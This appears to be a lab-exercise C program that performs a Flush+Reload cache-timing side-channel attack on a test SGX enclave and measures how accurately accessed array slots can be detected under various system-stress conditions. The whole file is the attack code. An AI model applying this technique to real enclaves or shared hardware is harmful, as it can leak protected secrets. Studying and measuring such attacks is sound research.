/* utility headers */
#include "debug.h"
#include "cacheutils.h"
#include<time.h>
#include<stdlib.h>
#include<stdio.h>
#include<stdbool.h>
/* SGX untrusted runtime */
#include <sgx_urts.h>
#include "Enclave/encl_u.h"

#define NUM_SAMPLES         5
#define NUM_SLOTS           1000
#define SLOT_SIZE           0x1000
#define ARRAY_LEN           (NUM_SLOTS*SLOT_SIZE)
#define GET_SLOT(k)         (array[k*SLOT_SIZE])
char /*__attribute__((aligned(0x1000)))*/ array[ARRAY_LEN];

sgx_enclave_id_t create_enclave(void)
{
    sgx_launch_token_t token = {0};
    int updated = 0;
    sgx_enclave_id_t eid = -1;

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                    &token, &updated, &eid, NULL ) );

    return eid;
}

int compare(const void * a, const void * b) {
   return ( *(uint64_t*)a - *(uint64_t*)b );
}
int tsc[NUM_SLOTS][NUM_SAMPLES];

int main( int argc, char **argv )
{
    sgx_enclave_id_t eid = create_enclave();
    int rv = 1, secret = 0;
    int i, j, med;

    /* Ensure array pages are mapped in */
    for (i=0; i < ARRAY_LEN; i++)
        array[i] = 0x00;

    for (j=0; j < NUM_SLOTS; j++)
        for (i=0; i < NUM_SAMPLES; i++)
            tsc[j][i] = 0;
    
    /* ---------------------------------------------------------------------- */
    info_event("calling enclave...");

    /* =========================== START SOLUTION =========================== */
    FILE *fptr;
    FILE *fptr1;
    int noE = 50;
    srand(time(0));
    int arrElemToAccess[noE];
    int ct = 0;
    bool vis[1001] = {false};
    int  curr =0;
    while(curr < noE){
	int nn = rand()%1000;
	if(vis[nn] == false){
        	arrElemToAccess[ct] = nn;
		ct += 1;
		curr += 1;
		vis[nn] = true;
	} else {
		continue;
	}
    }
    //for(int i=0;i<noE;i++)
    //	printf("%d\n",arrElemToAccess[i]);
    //int arrElemToAccess[] = {5,62,66,125,521,150,985,678,10,775,582,843,101,192,852,724,824,412,132,842};
    for (i=0; i < NUM_SAMPLES; i++)
    {
        /* 1. Flush */
        for (j=0; j < NUM_SLOTS; j++)
            flush(&GET_SLOT(j));

        /* 2. Victim exec */
        for(int k=0;k<noE;k++)
        	SGX_ASSERT( ecall_secret_lookup(eid, array, ARRAY_LEN, arrElemToAccess[k]) );

        /* 3. Reload */
        for (j=0; j < NUM_SLOTS; j++)
            tsc[j][i] = reload(&GET_SLOT(j));
    }
    /* =========================== END SOLUTION =========================== */
    int avgArrAccessElem = 0;
    //fptr = fopen("f_r_withoutStress.txt","w");  
    //fptr1 = fopen("f_r_withoutStress_readings.txt","w");
      
    //fptr = fopen("f_r_withStressCPU.txt","w");     // 16
    //fptr1 = fopen("f_r_withStressCPU_readings.txt","w");

    //fptr = fopen("f_r_withStressCache.txt","w");   // 15
    //fptr1 = fopen("f_r_withStressCache_readings.txt","w");

    //fptr = fopen("f_r_withStressIO.txt","w");     // 100
    //fptr1 = fopen("f_r_withStressIO_readings.txt","w");

    //fptr = fopen("f_r_oneThreadOfSingleCPU.txt","w"); 
    //fptr1 = fopen("f_r_oneThreadOfSingleCPU_readings.txt","w");

    //fptr = fopen("f_r_oneThreadOfAllCPU.txt","w"); 
    //fptr1 = fopen("f_r_oneThreadOfAllCPU_readings.txt","w");

    //fptr = fopen("f_r_withStressVM.txt","w");    // stress-ng --vm 30 --vm-bytes 30G
    //fptr1 = fopen("f_r_withStressVM_readings.txt","w");

    //fptr = fopen("f_r_withStressContextSwitch.txt","w"); 
    //fptr1 = fopen("f_r_withStressContextSwitch_readings.txt","w");

    //fptr = fopen("f_r_Cpu0_Stress0.txt","w"); 
    //fptr1 = fopen("f_r_Cpu0_Stress0_readings.txt","w");

    //fptr = fopen("f_r_Cpu0-7_Stress0-7.txt","w"); 
    //fptr1 = fopen("f_r_Cpu0-7_Stress0-7_readings.txt","w");

    fptr = fopen("f_r_Random.txt","w"); 
    fptr1 = fopen("f_r_Random_readings.txt","w");

    int afterFR[1000];
    for (j=0; j < NUM_SLOTS; j++)
    {
        /* compute median over all samples (avg may be affected by outliers) */
        qsort(tsc[j], NUM_SAMPLES, sizeof(int), compare);
        med = tsc[j][NUM_SAMPLES/2];
	afterFR[j] = med;
	fprintf(fptr,"%d %d\n",j,med);
        for(int k=0;k<noE;k++){
	    if(arrElemToAccess[k] == j) {
		avgArrAccessElem += med;
		fprintf(fptr1,"Time slot %3d (CPU cycles): %d\n", j, med);	
		printf("Time slot %3d (CPU cycles): %d\n", j, med);
	    }
	}
    }
    int threshold = (avgArrAccessElem/noE);
    fprintf(fptr1,"Threshold can be set to  : %d to %d\n",threshold-15,threshold+15);
    printf("Threshold can be set to  : %d to %d\n",threshold-15,threshold+15);
    int after_FR = 0;
    int A=0,B=0,C=0,D=0;
    for(int i=0;i<1000;i++){
	if(afterFR[i] <= threshold+15) {
		bool flag = false;
		for(int j=0;j<noE;j++){
			if(i == arrElemToAccess[j]){
				after_FR += 1;
				A += 1;
				flag = true;
				break;
			}
		}
		if(flag == false){
			C += 1;
		}
	} else {
		bool flag = false;
		for(int j=0;j<noE;j++){
			if(i == arrElemToAccess[j]){
				B += 1;
				flag = true;
				break;
			}
		}
		if(flag == false){
			D += 1;
		}
	}
    }
    fprintf(fptr,"%d %d %d %d\n",A,B,C,D);
    printf("Values of confusion Matrix are : %d %d %d %d\n",A,B,C,D);
    fclose(fptr);
    fprintf(fptr1,"Elements having cycle time less than threshold is : %d\n",after_FR);
    printf("Elements having cycle time less than threshold is : %d\n",after_FR);

    /* ---------------------------------------------------------------------- */
    info_event("destroying SGX enclave");
    SGX_ASSERT( sgx_destroy_enclave( eid ) );

    info("all is well; exiting..");
	return 0;
}
